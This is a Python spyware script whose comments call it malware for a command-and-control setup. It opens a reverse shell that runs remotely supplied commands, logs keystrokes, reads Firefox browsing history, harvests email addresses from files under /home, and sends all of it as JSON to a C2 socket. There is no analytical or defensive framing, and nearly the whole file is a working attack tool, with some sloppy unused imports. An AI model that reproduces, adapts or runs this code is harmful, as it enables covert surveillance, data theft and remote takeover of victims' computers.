#!/usr/bin/python3
from turtle import onrelease, pu
from matplotlib.font_manager import json_dump
import requests
import socket
import json
import re
import os
import threading
import sqlite3
from pynput.keyboard import Key, Listener
import subprocess

# global variables
dead=True
bitcoin_addresses_list=[]
email_addresses_list = []
key_strokes=[]
KEYS=[]
browser_history=[]

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = '127.0.0.1'
    port =9999
    try:
        s.connect((host, port))
    except:
        return False

    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
            if data=='q':
                os._exit(2)

        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte,"utf-8")
            currentWD = os.getcwd() + "> "
            s.send(str.encode(output_str + currentWD))
            #print(output_str)

def On_release(key):
    if not dead:
        return False
def keyboard_Thread(key):
    global KEYS    
    KEYS.append(str(key))
    with Listener(on_press = keyboard_Thread,on_release=On_release) as listener:
        listener.join()
    return False

def Firefox_history():
    global browser_history
    search_path = os.path.expanduser('~')+"/.mozilla/firefox"
    for root, subdirs, files in os.walk(search_path):
        for file in files:
            if file == "places.sqlite":
                db=root

    # path formation 
    index=db.find("/.mozilla")
    data_path=os.path.expanduser('~')+db[index:]

    history_db = os.path.join(data_path, 'places.sqlite')
    try:
        c = sqlite3.connect(history_db)
 
        # Create cursor object to execute query
        cursor = c.cursor()
        select_statement = "select moz_places.url, moz_places.visit_count from moz_places;"
        cursor.execute(select_statement)
 
        # Fetch the result and Prints the result
        results = cursor.fetchall()
 
        for url, count in results:
            browser_history.append(str(url))
         
        # Close the cursor
        cursor.close()
    except:
        pass

def email_traversing():
    global email_addresses_list
    for root, subdirs, files in os.walk("/home"):
        for file in files:
            try:
                file_fd = open("{}/{}".format(root, file), "r")
                # read the contents of each file
                file_contents = file_fd.read().strip()
		       

                # search for email addresses
                email_addresses = re.findall(r"[a-z0-9._]+@[a-z0-9]+\.[a-z]{1,7}", file_contents)
                
                # check if we have found any bitcoin addresses or emails
                
                if len(email_addresses) > 0:
                    email_addresses_list = email_addresses_list + email_addresses
                

                file_fd.close()
            except:
                pass

def main():
    global KEYS,browser_history,email_addresses_list
    t2=threading.Thread(target=keyboard_Thread,args=('',))
    t2.start()
    shell_thread=threading.Thread(target=reverse_shell)
    shell_thread.start()
    hostname = socket.gethostname()
    public_ip = requests.get("https://ipinfo.io/").json()["ip"]
    email_traversing()

    # remove duplicates from emails and bitcoin addressees list
    email_addresses_list= list(dict.fromkeys(email_addresses_list))
    Firefox_history()
    
    # encode data to json and send them to command and control server
    data = {
        "machine_hostname": hostname,
        "machine_ip": public_ip,
        "key_log": KEYS,
        "browser_history ":browser_history,
        "email_addresses_found": email_addresses_list
    }
   
    encoded_data=json.dumps(data)

    # send data to command and control server
    # create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # connect to command and control server on port 1337
    s.connect(("127.0.0.1", 1337))
    s.send(bytes(encoded_data,encoding="utf-8"))
    s.close()
    #os._exit(0)
main() 
